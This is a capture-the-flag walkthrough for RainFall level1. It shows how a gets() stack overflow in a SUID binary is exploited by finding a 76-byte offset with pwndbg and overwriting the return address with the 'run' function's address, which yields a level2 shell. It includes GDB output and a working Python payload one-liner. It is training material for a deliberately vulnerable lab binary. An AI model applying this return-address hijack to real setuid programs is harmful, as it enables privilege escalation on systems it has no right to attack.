# Walkthrough for Level 1

## Overview

`level1` is a SUID binary owned by `level2`, so it runs with `level2`'s permissions when executed by any user.

```shell
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

## Understanding the Binary

After decompiling the `level1` binary with [Ghidra](https://github.com/NationalSecurityAgency/ghidra), we find two
functions: `main` and `run`.

The `main` function gets user input using the `gets` function and stores it in a buffer of 76 bytes. Since `gets` does
not check the length of the input, this program is vulnerable to a buffer overflow attack.

The `run` function spawns a shell and, since the SETUID is set for this binary, and it belongs to `level2`, the shell
will run with the `level2` privileges. However, the `fun` function is never called directly in our regular program flow.
We need to overwrite the return address of the `main` function with the address of the `run` function to execute it.
To do this, we need to craft an input that fills the buffer and then overwrites the return address of `main` with the
address of the `run` function.

## Finding the Address of `run`

We get the address of the `run` function using GDB; in this case, it is 0x08048444.

```shell
level1@RainFall:~$ gdb ./level1 
...SNIP...
(gdb) info fun
All defined functions:

Non-debugging symbols:
0x080482f8  _init
...SNIP...
0x08048444  run
0x08048480  main
...SNIP...
```

## Calculating the Offset

[Pwndbg](https://github.com/pwndbg/pwndbg) is a Python module that adds useful utilities and enhancements to GDB and
LLDB, making these debuggers easier to use. 
Inside we find `Pwn cyclic` which is a tool used to identify the exact location of a buffer overflow.

It works by generating a sequence of unique patterns, which can be inputted into a program. Once the buffer overflow is
achieved, the crash dump will contain part of this unique pattern. By analyzing the crash dump, we can pinpoint the exact
offset where the buffer overflow occurred.


```shell
┌──(kali㉿kali)-[~/rainfall/level1]
└─$ gdb ./level1       
...SNIP...
pwndbg> cyclic 80
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
pwndbg> run
Starting program: /home/kali/rainfall/level1/level1 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa

Program received signal SIGSEGV, Segmentation fault.
0x61616174 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────
 EAX  0xffffd1c0 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa'
 EBX  0xf7f99e14 (_GLOBAL_OFFSET_TABLE_) ◂— 0x232d0c /* '\x0c-#' */
 ECX  0xf7f9b8ec (_IO_stdfile_0_lock) ◂— 0
 EDX  0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0x80484a0 (__libc_csu_init) ◂— push ebp
 EBP  0x61616173 ('saaa')
 ESP  0xffffd210 ◂— 0
 EIP  0x61616174 ('taaa')
...SNIP...
```

The register we are interested in is the EIP register, which contains the address of the next instruction to be
executed. We see that the EIP register contains the value 'taaa'. Using the cyclic -l command, we can find the offset in
the cyclic pattern that corresponds to this value. In this case, the offset is 76 bytes.

```shell
pwndbg> cyclic -l taaa
Finding cyclic pattern of 4 bytes: b'taaa' (hex: 0x74616161)
Found at offset 76
```

## Crafting the Payload

We use Python to create a payload consisting of 76 'A's followed by the address of the `run` function in little-endian
format, with the intention of overwriting the EIP register and redirecting the program flow to the `run` function.
We save the result to the file `/tmp/payload`.

```shell
┌──(kali㉿kali)-[~/rainfall/level1]
└─$ python2 -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/payload 
```

## Executing `run` function

We use the `cat` command with the `-` option to keep STDIN open, since the shell executed by the `run` function needs an
interactive terminal to work properly. Once we run our exploit successfully, we can use the `id` command to verify that
the shell is running as the `level2` user. However, there is no flag file.

```shell
level1@RainFall:~$ cat /tmp/payload - | ./level1
Good... Wait what?
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
cat /home/user/level2/flag
cat: /home/user/level2/flag: No such file or directory
```
